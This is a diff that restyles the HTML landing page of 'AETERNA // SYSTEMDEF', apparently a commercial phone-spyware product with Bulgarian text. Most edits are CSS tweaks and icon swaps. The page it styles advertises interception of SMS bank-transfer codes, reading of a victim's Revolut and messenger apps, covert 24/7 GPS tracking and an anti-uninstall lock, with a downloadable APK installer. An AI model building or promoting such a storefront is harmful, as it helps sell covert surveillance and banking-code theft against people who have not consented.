@@ -7,20 +7,20 @@
   <meta name="description" content="Next-generation Platform-as-a-Service (PaaS) engineered for corporate intelligence, executive endpoint governance, and real-time remote device telemetry.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,800;1,400&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #020409;
-      --bg-surface: #070c18;
-      --card: rgba(9, 16, 30, 0.88);
-      --card-hover: rgba(14, 25, 48, 0.96);
-      --border: rgba(0, 240, 255, 0.18);
-      --border-strong: rgba(0, 240, 255, 0.45);
+      --bg: #03060c;
+      --bg-surface: #070d18;
+      --card: rgba(10, 18, 32, 0.88);
+      --card-hover: rgba(15, 27, 48, 0.96);
+      --border: rgba(0, 240, 255, 0.16);
+      --border-strong: rgba(0, 240, 255, 0.38);
       --cyan: #00f0ff;
-      --cyan-glow: rgba(0, 240, 255, 0.35);
+      --cyan-glow: rgba(0, 240, 255, 0.28);
       --gold: #f59e0b;
       --green: #10b981;
-      --green-glow: rgba(16, 185, 129, 0.3);
+      --green-glow: rgba(16, 185, 129, 0.25);
       --red: #f43f5e;
       --purple: #8b5cf6;
       --blue: #3b82f6;
@@ -28,7 +28,7 @@
       --text-dim: #94a3b8;
       --muted: #64748b;
       --shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.9);
-      --shadow-cyan: 0 10px 40px -5px rgba(0, 240, 255, 0.3);
+      --shadow-cyan: 0 10px 40px -5px rgba(0, 240, 255, 0.25);
     }
 
     * {
@@ -45,16 +45,25 @@
     body {
       background: var(--bg);
       background-image: 
-        radial-gradient(circle at 15% 10%, rgba(0, 240, 255, 0.09), transparent 50%),
-        radial-gradient(circle at 85% 90%, rgba(139, 92, 246, 0.08), transparent 50%),
-        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+        radial-gradient(circle at 15% 10%, rgba(0, 240, 255, 0.08), transparent 50%),
+        radial-gradient(circle at 85% 90%, rgba(139, 92, 246, 0.06), transparent 50%),
+        linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
       background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
       color: var(--text);
       font-family: 'Outfit', sans-serif;
       min-height: 100vh;
       overflow-x: hidden;
       line-height: 1.5;
+    }
+
+    /* Icon Utility */
+    .icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      stroke-width: 2;
     }
 
     /* ══════════════════════════════════════════════════════════════ */
@@ -65,7 +74,7 @@
       top: 0;
       z-index: 1000;
       width: 100%;
-      background: rgba(2, 4, 9, 0.88);
+      background: rgba(3, 6, 12, 0.88);
       backdrop-filter: blur(24px);
       border-bottom: 1px solid var(--border);
       padding: 14px 32px;
@@ -84,20 +93,20 @@
     }
 
     .nav-logo-glyph {
-      width: 40px;
-      height: 40px;
-      border-radius: 12px;
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.25), rgba(16, 185, 129, 0.25));
-      border: 1px solid var(--cyan);
+      width: 38px;
+      height: 38px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(16, 185, 129, 0.15));
+      border: 1px solid var(--border-strong);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 20px;
-      box-shadow: 0 0 20px var(--cyan-glow);
+      color: var(--cyan);
+      box-shadow: 0 0 15px var(--cyan-glow);
     }
 
     .nav-title {
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 800;
       letter-spacing: 0.5px;
       color: #fff;
@@ -165,19 +174,19 @@
     }
 
     .btn-portal-login {
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(245, 158, 11, 0.15));
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.12), rgba(245, 158, 11, 0.12));
       border: 1px solid var(--cyan);
       color: #fff;
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
-      font-weight: 800;
+      font-weight: 700;
       padding: 9px 18px;
       border-radius: 8px;
       cursor: pointer;
       display: flex;
       align-items: center;
       gap: 8px;
-      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
       transition: all 0.25s;
     }
     .btn-portal-login:hover {
@@ -205,7 +214,7 @@
     .hero-section {
       text-align: center;
       padding: 40px 0 50px;
-      max-width: 1000px;
+      max-width: 1020px;
       margin: 0 auto;
     }
 
@@ -213,18 +222,18 @@
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      background: rgba(0, 240, 255, 0.08);
+      background: rgba(0, 240, 255, 0.06);
       border: 1px solid var(--border-strong);
       padding: 7px 18px;
       border-radius: 9999px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 800;
+      font-weight: 700;
       color: var(--cyan);
       text-transform: uppercase;
       letter-spacing: 1.5px;
       margin-bottom: 24px;
-      box-shadow: 0 0 25px rgba(0, 240, 255, 0.15);
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.12);
     }
 
     .hero-title {
@@ -259,7 +268,7 @@
       background: linear-gradient(135deg, #00f0ff, #0284c7);
       color: #020617;
       font-family: 'Outfit', sans-serif;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 800;
       padding: 15px 32px;
       border-radius: 12px;
@@ -274,7 +283,7 @@
     }
     .btn-primary-cta:hover {
       transform: translateY(-2px);
-      box-shadow: 0 15px 40px rgba(0, 240, 255, 0.45);
+      box-shadow: 0 15px 40px rgba(0, 240, 255, 0.4);
     }
 
     .btn-secondary-cta {
@@ -282,7 +291,7 @@
       border: 1px solid var(--border);
       color: #fff;
       font-family: 'Outfit', sans-serif;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
       padding: 15px 28px;
       border-radius: 12px;
@@ -299,7 +308,7 @@
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* THE FLAGSHIP INTERACTIVE DEMO HUD (THE DISPLEY SHOWCASE) */
+    /* THE FLAGSHIP INTERACTIVE DEMO HUD (THE DISPLAY SHOWCASE) */
     /* ══════════════════════════════════════════════════════════════ */
     .section-header {
       text-align: center;
@@ -353,7 +362,7 @@
       left: 100px;
       width: 400px;
       height: 400px;
-      background: radial-gradient(circle, rgba(0, 240, 255, 0.12), transparent 70%);
+      background: radial-gradient(circle, rgba(0, 240, 255, 0.1), transparent 70%);
       pointer-events: none;
     }
 
@@ -378,15 +387,15 @@
       position: relative;
       box-shadow: 
         0 30px 70px rgba(0, 0, 0, 0.95),
-        0 0 35px rgba(0, 240, 255, 0.22),
-        inset 0 0 15px rgba(255, 255, 255, 0.05);
+        0 0 35px rgba(0, 240, 255, 0.18),
+        inset 0 0 15px rgba(255, 255, 255, 0.04);
       user-select: none;
       transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
     }
 
     .phone-punchhole {
-      width: 14px;
-      height: 14px;
+      width: 12px;
+      height: 12px;
       background: #000;
       border: 1.5px solid #334155;
       border-radius: 50%;
@@ -395,7 +404,7 @@
       left: 50%;
       transform: translateX(-50%);
       z-index: 40;
-      box-shadow: 0 0 8px rgba(16, 185, 129, 0.8);
+      box-shadow: 0 0 8px rgba(16, 185, 129, 0.6);
     }
 
     .phone-screen {
@@ -406,7 +415,7 @@
       display: flex;
       flex-direction: column;
       position: relative;
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.05);
     }
 
     /* Top Phone Status Bar */
@@ -420,7 +429,7 @@
       color: var(--text-dim);
       font-weight: 700;
       z-index: 30;
-      background: rgba(4, 8, 18, 0.8);
+      background: rgba(4, 8, 18, 0.85);
       backdrop-filter: blur(8px);
     }
 
@@ -430,19 +439,32 @@
       top: -90px;
       left: 10px;
       right: 10px;
-      background: rgba(15, 23, 42, 0.95);
+      background: rgba(15, 23, 42, 0.96);
       border: 1px solid var(--cyan);
       border-radius: 16px;
       padding: 12px 14px;
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 12px;
       box-shadow: 0 12px 30px rgba(0, 0, 0, 0.8);
       z-index: 50;
       transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
     .phone-notif-toast.show {
       top: 38px;
+    }
+
+    .notif-svg-wrap {
+      width: 34px;
+      height: 34px;
+      border-radius: 10px;
+      background: rgba(0, 240, 255, 0.12);
+      border: 1px solid var(--border);
+      color: var(--cyan);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
     }
 
     /* Active Phone App Screens */
@@ -500,9 +522,9 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
       position: relative;
+      color: #fff;
     }
     .app-icon-label {
       font-size: 11px;
@@ -596,7 +618,7 @@
     .phone-home-pill {
       width: 110px;
       height: 4px;
-      background: rgba(255, 255, 255, 0.4);
+      background: rgba(255, 255, 255, 0.35);
       border-radius: 9999px;
       transition: background 0.2s;
     }
@@ -620,20 +642,20 @@
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
       font-weight: 700;
-      padding: 9px 8px;
+      padding: 10px 8px;
       border-radius: 8px;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 6px;
+      gap: 8px;
       transition: all 0.2s;
     }
     .btn-sim-action:hover {
-      background: rgba(0, 240, 255, 0.15);
+      background: rgba(0, 240, 255, 0.12);
       border-color: var(--cyan);
       color: var(--cyan);
-      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.18);
     }
 
     /* ═══════ THE OBSERVER DECK (RIGHT PANEL) ═══════ */
@@ -848,7 +870,7 @@
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      gap: 8px;
       transition: all 0.2s;
     }
     .btn-term-action:hover {
@@ -867,7 +889,7 @@
     }
 
     .download-card {
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(10, 18, 32, 0.95));
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.05), rgba(10, 18, 32, 0.95));
       border: 1px solid var(--border-strong);
       border-radius: 24px;
       padding: 36px;
@@ -880,15 +902,15 @@
     .apk-meta-badge {
       display: inline-flex;
       align-items: center;
-      gap: 6px;
-      background: rgba(16, 185, 129, 0.12);
+      gap: 8px;
+      background: rgba(16, 185, 129, 0.1);
       border: 1px solid var(--green);
       color: var(--green);
       padding: 5px 12px;
       border-radius: 8px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 800;
+      font-weight: 700;
       margin-bottom: 16px;
     }
 
@@ -911,8 +933,8 @@
       background: linear-gradient(135deg, var(--green), #059669);
       color: #020617;
       font-family: 'Outfit', sans-serif;
-      font-size: 16px;
-      font-weight: 900;
+      font-size: 15px;
+      font-weight: 800;
       padding: 16px;
       border-radius: 12px;
       text-align: center;
@@ -921,12 +943,12 @@
       justify-content: center;
       align-items: center;
       gap: 10px;
-      box-shadow: 0 10px 30px rgba(16, 185, 129, 0.35);
+      box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
       transition: all 0.25s;
     }
     .btn-download-apk:hover {
       transform: translateY(-2px);
-      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.5);
+      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.45);
     }
 
     .steps-card {
@@ -946,7 +968,7 @@
       width: 36px;
       height: 36px;
       border-radius: 50%;
-      background: rgba(0, 240, 255, 0.1);
+      background: rgba(0, 240, 255, 0.08);
       border: 1px solid var(--cyan);
       color: var(--cyan);
       font-family: 'JetBrains Mono', monospace;
@@ -997,8 +1019,8 @@
     }
     .pricing-card.featured {
       border-color: var(--cyan);
-      background: linear-gradient(180deg, rgba(0, 240, 255, 0.09) 0%, rgba(9, 16, 30, 0.96) 100%);
-      box-shadow: 0 0 40px rgba(0, 240, 255, 0.18);
+      background: linear-gradient(180deg, rgba(0, 240, 255, 0.08) 0%, rgba(9, 16, 30, 0.96) 100%);
+      box-shadow: 0 0 40px rgba(0, 240, 255, 0.16);
       transform: scale(1.02);
     }
     .pricing-card:hover {
@@ -1014,7 +1036,7 @@
       color: #020617;
       font-family: 'JetBrains Mono', monospace;
       font-size: 10px;
-      font-weight: 900;
+      font-weight: 800;
       padding: 5px 14px;
       border-radius: 9999px;
       text-transform: uppercase;
@@ -1037,7 +1059,7 @@
     .plan-price {
       font-family: 'JetBrains Mono', monospace;
       font-size: 36px;
-      font-weight: 900;
+      font-weight: 800;
       color: #fff;
       margin-bottom: 24px;
     }
@@ -1059,7 +1081,7 @@
       color: var(--text-dim);
       padding: 7px 0;
     }
-    .plan-features li span { color: var(--green); font-weight: 900; }
+    .plan-features li svg { color: var(--green); }
 
     .btn-plan {
       width: 100%;
@@ -1114,7 +1136,7 @@
       border: 1px solid var(--cyan);
       border-radius: 24px;
       padding: 38px 30px;
-      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95), 0 0 40px var(--cyan-glow);
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95), 0 0 35px var(--cyan-glow);
       text-align: center;
       position: relative;
       animation: modalFadeIn 0.3s ease;
@@ -1132,16 +1154,29 @@
       background: transparent;
       border: none;
       color: var(--muted);
-      font-size: 22px;
+      font-size: 20px;
       cursor: pointer;
     }
     .modal-close-btn:hover { color: #fff; }
 
+    .modal-logo-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 12px;
+      background: rgba(0, 240, 255, 0.1);
+      border: 1px solid var(--border-strong);
+      color: var(--cyan);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+    }
+
     .modal-logo {
-      font-size: 22px;
-      font-weight: 900;
+      font-size: 20px;
+      font-weight: 800;
       color: #fff;
-      letter-spacing: 1px;
+      letter-spacing: 0.5px;
       margin-bottom: 6px;
     }
 
@@ -1177,22 +1212,22 @@
 
     .btn-modal-unlock {
       width: 100%;
-      background: linear-gradient(135deg, var(--cyan), var(--gold));
+      background: linear-gradient(135deg, var(--cyan), #0284c7);
       color: #020617;
       border: none;
       padding: 15px;
       border-radius: 12px;
       font-family: 'Outfit', sans-serif;
       font-size: 15px;
-      font-weight: 900;
-      letter-spacing: 1px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
       cursor: pointer;
-      box-shadow: 0 0 25px rgba(0, 240, 255, 0.35);
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.3);
       transition: all 0.2s;
     }
     .btn-modal-unlock:hover {
       transform: translateY(-1px);
-      box-shadow: 0 0 35px rgba(0, 240, 255, 0.55);
+      box-shadow: 0 0 35px rgba(0, 240, 255, 0.5);
     }
 
     /* ══════════════════════════════════════════════════════════════ */
@@ -1227,7 +1262,7 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      background: rgba(16, 185, 129, 0.1);
+      background: rgba(16, 185, 129, 0.08);
       border: 1px solid var(--green);
       color: var(--green);
       padding: 6px 14px;
@@ -1330,8 +1365,8 @@
       top: 14px;
       left: 50%;
       transform: translateX(-50%);
-      width: 13px;
-      height: 13px;
+      width: 12px;
+      height: 12px;
       background: #000;
       border: 1.5px solid #1a2233;
       border-radius: 50%;
@@ -1446,6 +1481,10 @@
       font-size: 11px;
       font-weight: 600;
       cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
       transition: all 0.2s;
     }
     .btn-ctrl:hover {
@@ -1454,7 +1493,7 @@
     }
 
     .btn-clear {
-      background: rgba(244, 63, 94, 0.15);
+      background: rgba(244, 63, 94, 0.12);
       border: 1px solid var(--red);
       color: var(--red);
       padding: 8px 14px;
@@ -1472,10 +1511,12 @@
   <!-- ══════════════════════════════════════════════════════════════ -->
   <nav class="top-nav">
     <a href="#" class="nav-brand">
-      <div class="nav-logo-glyph">🛡️</div>
+      <div class="nav-logo-glyph">
+        <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
       <div>
         <div class="nav-title">AETERNA // SYSTEMDEF</div>
-        <div class="nav-subtitle">PaaS Sovereign Telemetry</div>
+        <div class="nav-subtitle">Sovereign Fleet Telemetry</div>
       </div>
     </a>
 
@@ -1495,7 +1536,8 @@
 
       <!-- Client Portal Button -->
       <button class="btn-portal-login" onclick="openAuthModal()">
-        <span>🔑</span> <span data-i18n="btn_login">Вход за Клиенти</span>
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        <span data-i18n="btn_login">Вход за Клиенти</span>
       </button>
     </div>
   </nav>
@@ -1507,8 +1549,9 @@
 
     <!-- HERO PRESENTATION -->
     <section class="hero-section" id="overview">
-      <div class="hero-badge" data-i18n="hero_badge">
-        <span>⚡</span> SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE
+      <div class="hero-badge">
+        <span class="pulse-dot" style="width: 6px; height: 6px;"></span>
+        <span data-i18n="hero_badge">SOVEREIGN FLEET INTELLIGENCE & ENDPOINT GOVERNANCE</span>
       </div>
 
       <h1 class="hero-title" data-i18n="hero_title">
@@ -1520,14 +1563,17 @@
       </p>
 
       <div class="hero-cta-group">
-        <a href="#interactive-display" class="btn-primary-cta" data-i18n="hero_btn_demo">
-          <span>📱</span> Изпробвай Дисплея на Живо
+        <a href="#interactive-display" class="btn-primary-cta">
+          <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          <span data-i18n="hero_btn_demo">Изпробвай Дисплея на Живо</span>
         </a>
-        <a href="#download" class="btn-secondary-cta" data-i18n="hero_btn_download">
-          <span>📥</span> Свали Инсталатора (APK)
+        <a href="#download" class="btn-secondary-cta">
+          <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          <span data-i18n="hero_btn_download">Свали Инсталатора (APK)</span>
         </a>
-        <button class="btn-secondary-cta" onclick="openAuthModal()" style="border-color: var(--cyan); color: var(--cyan);" data-i18n="hero_btn_login">
-          <span>🔑</span> Въведи Лицензен Ключ
+        <button class="btn-secondary-cta" onclick="openAuthModal()" style="border-color: var(--cyan); color: var(--cyan);">
+          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span data-i18n="hero_btn_login">Въведи Лицензен Ключ</span>
         </button>
       </div>
     </section>
@@ -1545,7 +1591,7 @@
 
     <div class="interactive-stage">
       
-      <!-- 📱 THE INTERACTIVE PHONE DISPLAY -->
+      <!-- THE INTERACTIVE PHONE DISPLAY -->
       <div class="phone-deck">
         <div class="flagship-phone" id="flagship-phone-el">
           <div class="phone-punchhole"></div>
@@ -1554,13 +1600,21 @@
             <!-- Dynamic Status Bar -->
             <div class="phone-status-bar">
               <span id="phone-clock">16:42</span>
-              <span>● 5G NR</span>
-              <span style="color: var(--green);">89% 🔋</span>
+              <span style="display: flex; align-items: center; gap: 4px;">
+                <svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M2 20h.01"/><path d="M7 20v-4"/><path d="M12 20v-8"/><path d="M17 20V4"/></svg>
+                5G
+              </span>
+              <span style="color: var(--green); display: flex; align-items: center; gap: 4px;">
+                <svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="1" y="6" width="18" height="12" rx="2"/><line x1="23" y1="11" x2="23" y2="13"/></svg>
+                89%
+              </span>
             </div>
 
             <!-- Intercepted Notification Toast -->
             <div class="phone-notif-toast" id="phone-toast">
-              <div style="font-size: 20px;" id="toast-icon">💬</div>
+              <div class="notif-svg-wrap" id="toast-icon">
+                <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              </div>
               <div style="flex: 1;">
                 <div style="font-size: 11px; font-weight: 800; color: var(--cyan);" id="toast-title">SMS Прихванат</div>
                 <div style="font-size: 10px; color: #cbd5e1;" id="toast-desc">Код: 894-112 за трансфер €4,500.00</div>
@@ -1580,39 +1634,39 @@
                 <div class="app-grid">
                   <!-- Banking App -->
                   <div class="app-icon-item" onclick="openPhoneApp('bank')">
-                    <div class="app-icon-box" style="background: linear-gradient(135deg, #312e81, #1e1b4b); border: 1px solid rgba(139, 92, 246, 0.5);">
-                      🏦
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #1e1b4b, #312e81); border: 1px solid rgba(139, 92, 246, 0.4);">
+                      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                     </div>
                     <span class="app-icon-label" data-i18n="app_banking">Revolut</span>
                   </div>
 
                   <!-- Telegram App -->
                   <div class="app-icon-item" onclick="openPhoneApp('telegram')">
-                    <div class="app-icon-box" style="background: linear-gradient(135deg, #0284c7, #0369a1); border: 1px solid rgba(0, 240, 255, 0.5);">
-                      💬
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #0284c7, #0369a1); border: 1px solid rgba(0, 240, 255, 0.4);">
+                      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
                     </div>
-                    <span class="app-icon-label">Telegram</span>
+                    <span class="app-icon-label">Signal / TG</span>
                   </div>
 
                   <!-- GPS Tracker -->
                   <div class="app-icon-item" onclick="openPhoneApp('gps')">
-                    <div class="app-icon-box" style="background: linear-gradient(135deg, #059669, #065f46); border: 1px solid rgba(16, 185, 129, 0.5);">
-                      📍
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #065f46, #047857); border: 1px solid rgba(16, 185, 129, 0.4);">
+                      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polygon points="3 11 22 2 13 21 11 13 3 11"/></svg>
                     </div>
                     <span class="app-icon-label" data-i18n="app_gps">GPS Радар</span>
                   </div>
 
                   <!-- System Services (Anti-Uninstall) -->
                   <div class="app-icon-item" onclick="triggerAntiUninstallDemo()">
-                    <div class="app-icon-box" style="background: linear-gradient(135deg, #475569, #1e293b); border: 1px solid rgba(255, 255, 255, 0.2);">
-                      ⚙️
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #334155, #1e293b); border: 1px solid rgba(255, 255, 255, 0.15);">
+                      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
                     </div>
                     <span class="app-icon-label" data-i18n="app_settings">Настройки</span>
                   </div>
                 </div>
 
-                <div style="margin-top: auto; background: rgba(0, 240, 255, 0.06); border: 1px dashed var(--border); border-radius: 12px; padding: 12px; text-align: center;">
-                  <div style="font-size: 10px; color: var(--cyan); font-weight: 800; letter-spacing: 1px; margin-bottom: 2px;" data-i18n="phone_daemon_status">🔒 SYSTEM SERVICES DAEMON ACTIVE</div>
+                <div style="margin-top: auto; background: rgba(0, 240, 255, 0.04); border: 1px dashed var(--border); border-radius: 12px; padding: 12px; text-align: center;">
+                  <div style="font-size: 10px; color: var(--cyan); font-weight: 800; letter-spacing: 1px; margin-bottom: 2px;" data-i18n="phone_daemon_status">SYSTEM SERVICES DAEMON ACTIVE</div>
                   <div style="font-size: 10px; color: var(--muted);" data-i18n="phone_daemon_sub">Фоново наблюдение 24/7 • 0% батерия в покой</div>
                 </div>
               </div>
@@ -1621,7 +1675,7 @@
               <div class="phone-view" id="phone-view-bank">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                   <span style="font-weight: 800; color: #fff; font-size: 14px;">Revolut Business</span>
-                  <span style="font-size: 10px; color: var(--green); font-weight: 700;">● SECURE</span>
+                  <span style="font-size: 10px; color: var(--green); font-weight: 700;">SECURE CHANNEL</span>
                 </div>
 
                 <div class="bank-balance-card">
@@ -1648,7 +1702,7 @@
               <!-- 3. TELEGRAM CHAT VIEW -->
               <div class="phone-view" id="phone-view-telegram">
                 <div style="display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 8px; margin-bottom: 12px;">
-                  <div style="width: 28px; height: 28px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; font-size: 12px;">🏛️</div>
+                  <div style="width: 28px; height: 28px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800;">HQ</div>
                   <div>
                     <div style="font-size: 12px; font-weight: 700; color: #fff;">Geneva Office Desk</div>
                     <div style="font-size: 9px; color: var(--green);">online</div>
@@ -1667,16 +1721,21 @@
                   </div>
                 </div>
 
-                <div style="background: rgba(255,255,255,0.05); border-radius: 8px; padding: 6px 10px; font-size: 11px; color: var(--text-dim); display: flex; justify-content: space-between;">
+                <div style="background: rgba(255,255,255,0.05); border-radius: 8px; padding: 8px 10px; font-size: 11px; color: var(--text-dim); display: flex; justify-content: space-between;">
                   <span>Напиши съобщение...</span>
-                  <span style="color: var(--cyan);">🎤</span>
+                  <span style="color: var(--cyan);">
+                    <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+                  </span>
                 </div>
               </div>
 
               <!-- 4. GPS RADAR VIEW -->
               <div class="phone-view" id="phone-view-gps">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                  <span style="font-weight: 800; font-size: 13px; color: var(--green);">🛰️ GPS SATELLITE LOCK</span>
+                  <span style="font-weight: 800; font-size: 12px; color: var(--green); display: flex; align-items: center; gap: 6px;">
+                    <span class="pulse-dot" style="width: 6px; height: 6px;"></span>
+                    GPS SATELLITE LOCK
+                  </span>
                   <span style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--cyan);">14 SATS</span>
                 </div>
 
@@ -1695,9 +1754,11 @@
 
               <!-- 5. ANTI-UNINSTALL DEFENSE OVERLAY -->
               <div class="call-overlay" id="anti-uninstall-overlay">
-                <div style="font-size: 42px;">🔐</div>
+                <div style="width: 56px; height: 56px; border-radius: 16px; background: rgba(244, 63, 94, 0.15); border: 1px solid var(--red); color: var(--red); display: flex; align-items: center; justify-content: center;">
+                  <svg class="icon" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
                 <div style="text-align: center;">
-                  <h3 style="font-size: 18px; font-weight: 900; color: var(--red); margin-bottom: 6px;">BLOCKED: ATTEMPT TO UNINSTALL</h3>
+                  <h3 style="font-size: 16px; font-weight: 800; color: var(--red); margin-bottom: 6px;">BLOCKED: ATTEMPT TO UNINSTALL</h3>
                   <p style="font-size: 11px; color: var(--text-dim); max-width: 240px; line-height: 1.4;">
